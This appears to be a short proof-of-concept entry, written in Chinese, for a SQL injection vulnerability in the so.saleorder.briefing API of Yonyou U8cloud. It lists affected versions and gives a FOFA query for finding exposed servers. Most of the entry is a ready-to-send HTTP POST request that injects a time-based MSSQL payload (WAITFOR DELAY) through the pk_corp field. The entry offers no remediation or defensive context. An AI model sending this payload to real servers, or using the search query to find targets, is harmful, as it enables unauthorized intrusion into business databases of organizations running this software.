# 用友U8cloud so.saleorder.briefing接口SQL注入漏洞

FOFA

```
title=="U8C"
```

影响版本

```
3.5，3.6，3.6sp，5.0，5.0sp，5.1，5.1sp
```

POC

```
POST /u8cloud/openapi/so.saleorder.briefing?appcode=huo&isEncrypt=N HTTP/1.1
Host:
User-Agent: Mozilla/5.0
Content-Length: 141

{"pk_corp":"1';WAITFOR DELAY '0:0:2'--","cuserid":"","date_begin":"","date_end":"",}
```